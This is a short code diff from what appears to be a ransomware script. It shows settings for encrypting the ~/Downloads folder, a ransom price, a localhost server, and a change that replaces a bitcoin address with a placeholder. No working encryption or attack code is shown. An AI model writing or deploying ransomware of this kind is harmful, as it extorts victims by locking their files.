@@ -89,7 +89,7 @@ def decryptGen(directory):
 
 # Directories to encrypt
 directories = ['~/Downloads']
-bitcoin = 'aAhR54GVf45FFf3q2kL'
+bitcoin = 'bitcoin_address'
 price = 3
 url = 'localhost'
 
